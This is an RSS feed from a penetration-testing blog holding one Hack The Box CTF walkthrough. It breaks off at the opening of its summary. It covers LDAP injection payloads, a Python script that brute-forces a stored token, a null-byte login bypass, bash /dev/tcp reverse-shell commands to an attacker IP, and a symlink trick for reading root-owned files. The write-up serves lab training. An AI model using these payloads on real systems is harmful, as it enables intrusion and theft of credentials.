@@ -1,0 +1,228 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Stoken on VAPT Walkthroughs</title><link>https://malayamanas.github.io/tags/stoken/</link><description>Recent content in Stoken on VAPT Walkthroughs</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 22 Sep 2025 09:00:00 +0000</lastBuildDate><atom:link href="https://malayamanas.github.io/tags/stoken/index.xml" rel="self" type="application/rss+xml"/><item><title>CTF HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/ctf-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 09:00:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/ctf-htb-walkthrough/</guid><description>&lt;h1 id="ctf-htb---insane-linux-box-walkthrough"&gt;CTF HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/51JQg202csw?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
+ &lt;/div&gt;
+
+&lt;h2 id="key-exploitation-steps-and-techniques"&gt;Key Exploitation Steps and Techniques&lt;/h2&gt;
+&lt;p&gt;Below is a chronological summary of the key exploitation steps and techniques used in the Hack The Box CTF challenge, as extracted from the provided data.&lt;/p&gt;
+&lt;h3 id="1-initial-enumeration-with-nmap"&gt;1. Initial Enumeration with Nmap&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Network scanning using Nmap with default scripts and version enumeration.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Command&lt;/strong&gt;: &lt;code&gt;nmap -sC -sV -oA nmap/CTF [TARGET-IP]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Findings&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Port 22: SSH (OpenSSH 7.4)&lt;/li&gt;
+&lt;li&gt;Port 80: HTTP (Apache httpd 2.4.6, CentOS)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Identify open ports, services, and operating system to understand the attack surface.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="2-web-server-exploration"&gt;2. Web Server Exploration&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Manual inspection of the web page hosted on port 80.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Navigated to &lt;code&gt;http://[TARGET-IP]&lt;/code&gt; in Firefox.&lt;/li&gt;
+&lt;li&gt;Identified a login page requiring a username and one-time password (OTP).&lt;/li&gt;
+&lt;li&gt;Noted warnings about brute-force protection and a &amp;ldquo;wall of sheep&amp;rdquo; listing banned IPs.&lt;/li&gt;
+&lt;li&gt;Reviewed page source for hints, finding a reference to an 81-digit software token stored in an existing attribute.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Gather information about the web application and its authentication mechanism.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="3-testing-for-cross-site-scripting-xss"&gt;3. Testing for Cross-Site Scripting (XSS)&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Attempted XSS by injecting HTML tags (e.g., &lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;) in the username field.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Result&lt;/strong&gt;: No response, indicating XSS filtering or lack of vulnerability.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Test for basic input validation weaknesses.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="4-double-url-encoding-attempt"&gt;4. Double URL Encoding Attempt&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used Burp Suite to manipulate login requests with double URL encoding to bypass potential input filters.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Intercepted login request with Burp Suite.&lt;/li&gt;
+&lt;li&gt;Encoded input (e.g., &lt;code&gt;username=test%3A%3B&lt;/code&gt;, &lt;code&gt;OTP=1234&lt;/code&gt;) and tested for bypass.&lt;/li&gt;
+&lt;li&gt;Resulted in &amp;ldquo;user is not found,&amp;rdquo; suggesting blacklisting of certain characters.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Attempt to evade input validation or blacklisting mechanisms.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="5-research-on-software-tokens"&gt;5. Research on Software Tokens&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Researched software token implementations for Linux, focusing on the 81-digit token mentioned in the page source.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Findings&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Identified &lt;code&gt;stoken&lt;/code&gt; as a potential software token application (RSA SecurID 128-bit compliant).&lt;/li&gt;
+&lt;li&gt;Noted that &lt;code&gt;stoken&lt;/code&gt; requires a seed and user information to generate tokens.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Understand the authentication mechanism and its reliance on software tokens.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="6-username-enumeration-with-wfuzz"&gt;6. Username Enumeration with wfuzz&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Brute-forced usernames using &lt;code&gt;wfuzz&lt;/code&gt; with a small username wordlist to avoid triggering brute-force protection.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Command&lt;/strong&gt;: &lt;code&gt;wfuzz -H -D &amp;quot;inputUsername=FUZZ&amp;amp;inputOTP=1234&amp;quot; -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt http://[TARGET-IP]/login.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Result&lt;/strong&gt;: No valid usernames found initially, as responses showed consistent 233 words (indicating &amp;ldquo;user not found&amp;rdquo;).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Identify valid usernames for the login form.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="7-identifying-ldap-injection"&gt;7. Identifying LDAP Injection&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Tested special characters to identify blacklisted inputs and suspected LDAP injection due to specific character filtering (e.g., null byte, parentheses, wildcard, backslash).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Used &lt;code&gt;wfuzz&lt;/code&gt; with a special characters wordlist: &lt;code&gt;wfuzz -H -D &amp;quot;inputUsername=FUZZ&amp;amp;inputOTP=1234&amp;quot; -w /usr/share/seclists/Fuzzing/special-chars.txt http://[TARGET-IP]/login.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Identified blacklisted characters: null byte (&lt;code&gt;%00&lt;/code&gt;), open parenthesis (&lt;code&gt;%28&lt;/code&gt;), close parenthesis (&lt;code&gt;%29&lt;/code&gt;), wildcard (&lt;code&gt;%2A&lt;/code&gt;), backslash (&lt;code&gt;%5C&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;Noted that a wildcard (&lt;code&gt;%2A&lt;/code&gt;) with username resulted in &amp;ldquo;cannot login&amp;rdquo; instead of &amp;ldquo;user not found,&amp;rdquo; suggesting a valid username or query success.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Confirm LDAP injection vulnerability due to specific character filtering patterns.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="8-ldap-username-discovery"&gt;8. LDAP Username Discovery&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used LDAP injection with wildcard to brute-force username characters.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Ran &lt;code&gt;wfuzz&lt;/code&gt; with a character set (a-z) appended with wildcard: &lt;code&gt;wfuzz -H -D &amp;quot;inputUsername=FUZZ%252A&amp;amp;inputOTP=1234&amp;quot; -w /usr/share/seclists/Fuzzing/1-char.txt http://[TARGET-IP]/login.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Identified username by iteratively building it: &lt;code&gt;L&lt;/code&gt;, &lt;code&gt;LD&lt;/code&gt;, &lt;code&gt;LDA&lt;/code&gt;, &lt;code&gt;LDAP&lt;/code&gt;, &lt;code&gt;LDAPu&lt;/code&gt;, &lt;code&gt;LDAPus&lt;/code&gt;, &lt;code&gt;LDAPuse&lt;/code&gt;, &lt;code&gt;LDAPuser&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Validated username &lt;code&gt;LDAPuser&lt;/code&gt; with OTP &lt;code&gt;1234&lt;/code&gt;, resulting in &amp;ldquo;cannot login.&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Discover the valid username &lt;code&gt;LDAPuser&lt;/code&gt; through LDAP injection.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="9-ldap-attribute-enumeration"&gt;9. LDAP Attribute Enumeration&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used LDAP injection to enumerate valid attributes.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Crafted LDAP query: &lt;code&gt;LDAPuser%29%28FUZZ%3D%2A&lt;/code&gt; (translated to &lt;code&gt;LDAPuser)(FUZZ=*)&lt;/code&gt;) to enumerate attributes.&lt;/li&gt;
+&lt;li&gt;Used &lt;code&gt;wfuzz&lt;/code&gt; with an LDAP attributes wordlist: &lt;code&gt;wfuzz -H -D &amp;quot;inputUsername=LDAPuser%29%28FUZZ%3D%2A&amp;amp;inputOTP=1234&amp;quot; -w attributes.txt http://[TARGET-IP]/login.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Identified valid attributes: &lt;code&gt;cn&lt;/code&gt;, &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;mail&lt;/code&gt;, &lt;code&gt;objectClass&lt;/code&gt;, &lt;code&gt;pager&lt;/code&gt;, &lt;code&gt;password&lt;/code&gt;, &lt;code&gt;sn&lt;/code&gt;, &lt;code&gt;uid&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Identify attributes in the LDAP schema, focusing on &lt;code&gt;pager&lt;/code&gt; as the likely storage for the 81-digit token.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="10-token-brute-forcing-with-python-script"&gt;10. Token Brute-Forcing with Python Script&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Developed a Python script to brute-force the 81-digit token stored in the &lt;code&gt;pager&lt;/code&gt; attribute.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Created &lt;code&gt;brute.py&lt;/code&gt; to automate LDAP injection for token enumeration.&lt;/li&gt;
+&lt;li&gt;Script logic:
+&lt;ul&gt;
+&lt;li&gt;Iterated through digits (0-9) to build the token.&lt;/li&gt;
+&lt;li&gt;Constructed LDAP query: &lt;code&gt;LDAPuser)(pager=tokenFUZZ*&lt;/code&gt; (e.g., &lt;code&gt;LDAPuser)(pager=28FUZZ*&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;Sent POST requests to &lt;code&gt;http://[TARGET-IP]/login.php&lt;/code&gt; with Burp proxy.&lt;/li&gt;
+&lt;li&gt;Checked for &amp;ldquo;cannot login&amp;rdquo; response to indicate a valid token prefix.&lt;/li&gt;
+&lt;li&gt;Included sleep to avoid brute-force bans.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Output token after 81 iterations (noted a trailing incorrect character).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Script Content&lt;/strong&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; time &lt;span style="color:#f92672"&gt;import&lt;/span&gt; sleep
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; string &lt;span style="color:#f92672"&gt;import&lt;/span&gt; digits
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;url &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;http://[TARGET-IP]/login.php&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;proxy &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {&lt;span style="color:#e6db74"&gt;&amp;#34;http&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;http://localhost:8080&amp;#34;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;attribute &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;pager&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;token &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;loop &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; loop:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; digit &lt;span style="color:#f92672"&gt;in&lt;/span&gt; digits:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; query &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;LDAPuser)(&lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;attribute&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;token&lt;span style="color:#e6db74"&gt;}{&lt;/span&gt;digit&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;*&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {&lt;span style="color:#e6db74"&gt;&amp;#34;inputUsername&amp;#34;&lt;/span&gt;: query, &lt;span style="color:#e6db74"&gt;&amp;#34;inputOTP&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;1234&amp;#34;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; response &lt;span style="color:#f92672"&gt;=&lt;/span&gt; requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;post(url, data&lt;span style="color:#f92672"&gt;=&lt;/span&gt;data, proxies&lt;span style="color:#f92672"&gt;=&lt;/span&gt;proxy)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;stdout&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(&lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\r&lt;/span&gt;&lt;span style="color:#e6db74"&gt;token: &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;token&lt;span style="color:#e6db74"&gt;}{&lt;/span&gt;digit&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;stdout&lt;span style="color:#f92672"&gt;.&lt;/span&gt;flush()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sleep(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;cannot login&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; response&lt;span style="color:#f92672"&gt;.&lt;/span&gt;text:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; token &lt;span style="color:#f92672"&gt;=&lt;/span&gt; token &lt;span style="color:#f92672"&gt;+&lt;/span&gt; digit
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;success: &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;token&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sleep(&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;elif&lt;/span&gt; digit &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;9&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; loop &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Result&lt;/strong&gt;: Obtained an 81-digit token (82 characters with an incorrect trailing character).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Retrieve the software token required for authentication.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="11-time-synchronization-for-token-validation"&gt;11. Time Synchronization for Token Validation&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used &lt;code&gt;stoken&lt;/code&gt; to generate OTP and synchronized system time to match the server.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Installed &lt;code&gt;stoken&lt;/code&gt; and ran: &lt;code&gt;stoken --token=&amp;lt;81-digit-token&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Noted requirement for a 4-8 digit PIN; used &lt;code&gt;0000&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Identified server time in response headers (e.g., 09:55 GMT).&lt;/li&gt;
+&lt;li&gt;Disabled NTP: &lt;code&gt;timedatectl set-ntp 0&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Set local time: &lt;code&gt;date -s 1757&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Generated OTP and tested login with &lt;code&gt;LDAPuser&lt;/code&gt; and OTP, resulting in a command execution interface.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Generate a valid OTP by aligning client and server time.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="12-bypassing-group-membership-check"&gt;12. Bypassing Group Membership Check&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used LDAP injection with a null byte to bypass group membership check (&lt;code&gt;memberOf ADM&lt;/code&gt; or &lt;code&gt;root&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Crafted query: &lt;code&gt;LDAPuser%00&lt;/code&gt; to terminate the LDAP query early.&lt;/li&gt;
+&lt;li&gt;Sent via Burp Suite, avoiding double URL encoding by the browser.&lt;/li&gt;
+&lt;li&gt;Successfully logged in, receiving a command execution interface.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Gain command execution by bypassing LDAP query restrictions.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="13-command-execution-and-reverse-shell"&gt;13. Command Execution and Reverse Shell&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Executed commands via the web interface and established a reverse shell.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Issued &lt;code&gt;whoami&lt;/code&gt; command, confirming &lt;code&gt;apache&lt;/code&gt; user.&lt;/li&gt;
+&lt;li&gt;Attempted reverse shell: &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/[ATTACKER-IP]/9001 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Switched to port 443 due to firewall restrictions: &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/[ATTACKER-IP]/443 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Established reverse shell as &lt;code&gt;apache&lt;/code&gt; user.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Gain interactive shell access to the system.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="14-ssh-access-as-ldapuser"&gt;14. SSH Access as LDAPuser&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used LDAP credentials found in &lt;code&gt;login.php&lt;/code&gt; to SSH into the box.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Inspected &lt;code&gt;login.php&lt;/code&gt; to find LDAP bind credentials: &lt;code&gt;LDAPuser&lt;/code&gt; and password.&lt;/li&gt;
+&lt;li&gt;SSH command: &lt;code&gt;ssh LDAPuser@[TARGET-IP]&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Successfully logged in and accessed &lt;code&gt;user.txt&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Gain a more stable shell with proper TTY support.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="15-privilege-escalation-via-backup-script"&gt;15. Privilege Escalation via Backup Script&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Exploited a backup script to read &lt;code&gt;root.txt&lt;/code&gt; via symbolic link manipulation.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Identified a cron job running &lt;code&gt;honeypot.sh&lt;/code&gt; every minute, creating 7z backups in &lt;code&gt;/backup&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Noted script used relative paths and a list file for archiving.&lt;/li&gt;
+&lt;li&gt;As &lt;code&gt;apache&lt;/code&gt; user, created files in &lt;code&gt;/var/www/html/uploads&lt;/code&gt;:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;touch @pleasesub&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ln -s /root/root.txt /var/www/html/uploads/pleasesub&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Waited for cron job to run, which archived &lt;code&gt;root.txt&lt;/code&gt; contents into an error log due to access denial.&lt;/li&gt;
+&lt;li&gt;Read the error log to extract the &lt;code&gt;root.txt&lt;/code&gt; hash.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Obtain the root flag without full root access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="summary"&gt;Summary&lt;/h3&gt;
+&lt;p&gt;The exploitation involved:&lt;/p&gt;</description></item></channel></rss>
